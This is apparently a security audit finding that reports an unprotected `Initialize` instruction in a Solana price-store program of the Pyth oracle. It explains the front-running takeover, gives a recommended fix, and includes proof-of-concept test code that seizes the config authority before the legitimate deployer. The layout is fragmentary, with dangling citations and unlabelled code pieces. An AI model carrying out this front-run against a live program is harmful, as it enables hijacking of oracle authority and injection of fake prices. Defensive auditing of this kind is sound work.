### Title
Unprivileged Front-Run of `Initialize` Permanently Hijacks Program Authority — (`target_chains/solana/programs/pyth-price-store/src/processor/initialize.rs`)

---

### Summary

The `Initialize` instruction has no access control on the payer/caller. Any signer can call it before the legitimate deployer, supply an arbitrary 32-byte value as `authority`, and permanently seize control of the config PDA. Once set, the config PDA cannot be re-initialized, locking the legitimate deployer out and giving the attacker sole authority over all publisher registration.

---

### Finding Description

`validate_payer` only enforces that the caller is a signer and writable — it performs no check that the caller is the program upgrade authority or any other privileged key: [1](#0-0) 

`InitializeArgs.authority` is a raw `[u8; 32]` with no validation — any 32-byte value is accepted: [2](#0-1) 

`accounts::config::create` only guards against re-initialization by checking `format != 0`. On a freshly created PDA the format field is zero, so this check always passes for the first caller: [3](#0-2) 

The `initialize` processor calls `config::create` with the attacker-supplied authority and no further validation: [4](#0-3) 

After the attacker's `Initialize` succeeds, the config PDA is owned by the program and already has `format = FORMAT`. Any subsequent `Initialize` call by the legitimate deployer will fail at `system_instruction::create_account` because the account already exists, and `config::create` would also return `AlreadyInitialized` if somehow reached. [5](#0-4) 

---

### Impact Explanation

`validate_authority` in `InitializePublisher` enforces that the signer matches `config.authority`: [6](#0-5) 

With the attacker's key stored as `config.authority`, the attacker is the sole entity that can call `InitializePublisher`. They can:
- Register malicious publishers pointing to attacker-controlled buffer accounts
- Inject fabricated price data into the oracle system
- Permanently block legitimate publishers from being registered (since `publisher_config` PDAs are also one-time-create)

Corrupted oracle prices directly cause financial losses for any protocol consuming Pyth price feeds.

---

### Likelihood Explanation

On Solana, program deployment (BPF loader upload) and the first `Initialize` call are **separate transactions**. Any window between deployment and initialization — even a single block — is exploitable. An attacker monitoring on-chain program deployments can trivially submit `Initialize` in the same block or the next one. No privileged access, leaked keys, or social engineering is required.

---

### Recommendation

Bind `Initialize` to the program's upgrade authority. Retrieve the program's `ProgramData` account (derived from the program ID via the BPF Upgradeable Loader), read the `upgrade_authority_address` field from it, and require that the payer/caller matches that address. This is the standard Solana pattern for one-time program initialization:

```rust
// In initialize(), after validate_payer:
let program_data = validate_program_data(accounts.next(), program_id)?;
let upgrade_authority = read_upgrade_authority(&program_data)?;
ensure!(ProgramError::MissingRequiredSignature,
    payer.key.to_bytes() == upgrade_authority);
```

Alternatively, pass the upgrade authority as a required signer and verify it against the on-chain `ProgramData` account.

    let attacker = Keypair::new();
    // Fund attacker

    let (config, config_bump) = Pubkey::find_program_address(&[CONFIG_SEED.as_bytes()], &id);
    let attacker_authority = attacker.pubkey().to_bytes();

    // Attacker calls Initialize first
    let mut data = vec![crate::instruction::Instruction::Initialize as u8, config_bump];
    data.extend_from_slice(&attacker_authority);
    let tx = Transaction::new_signed_with_payer(
        &[Instruction { program_id: id, data, accounts: vec![
            AccountMeta::new(attacker.pubkey(), true),
            AccountMeta::new(config, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ]}],
        Some(&attacker.pubkey()), &[&attacker], recent_blockhash,
    );
    banks_client.process_transaction(tx).await.unwrap(); // succeeds

    // Assert attacker's authority is stored
    let config_account = banks_client.get_account(config).await.unwrap().unwrap();
    let config_data = accounts::config::read(&config_account.data).unwrap();
    assert_eq!(config_data.authority, attacker_authority); // attacker owns the program

    // Legitimate deployer's Initialize now fails
    let legitimate_authority = legitimate_deployer.pubkey().to_bytes();
    let mut data2 = vec![crate::instruction::Instruction::Initialize as u8, config_bump];
    data2.extend_from_slice(&legitimate_authority);
    let tx2 = Transaction::new_signed_with_payer(
        &[Instruction { program_id: id, data: data2, accounts: vec![
            AccountMeta::new(legitimate_deployer.pubkey(), true),
            AccountMeta::new(config, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ]}],
        Some(&legitimate_deployer.pubkey()), &[&legitimate_deployer], recent_blockhash,
    );
    assert!(banks_client.process_transaction(tx2).await.is_err()); // fails: already initialized
}

pub fn validate_authority<'a, 'b>(
    account: Option<&'b AccountInfo<'a>>,
    config: &AccountInfo<'a>,
) -> Result<&'b AccountInfo<'a>, ProgramError> {
    let authority = account.ok_or(ProgramError::NotEnoughAccountKeys)?;
    ensure!(ProgramError::MissingRequiredSignature, authority.is_signer);
    ensure!(ProgramError::InvalidArgument, authority.is_writable);
    let config_data = config.data.borrow();
    let config = accounts::config::read(*config_data)?;
    ensure!(
        ProgramError::MissingRequiredSignature,
        authority.key.to_bytes() == config.authority
    );
    Ok(authority)

pub fn create(data: &mut [u8], authority: [u8; 32]) -> Result<&mut Config, ReadAccountError> {
    if data.len() < size_of::<Config>() {
        return Err(ReadAccountError::DataTooShort);
    }
    let data: &mut Config = from_bytes_mut(&mut data[..size_of::<Config>()]);
    if data.format != 0 {
        return Err(ReadAccountError::AlreadyInitialized);
    }
    data.format = FORMAT;
    data.authority = authority;
    Ok(data)
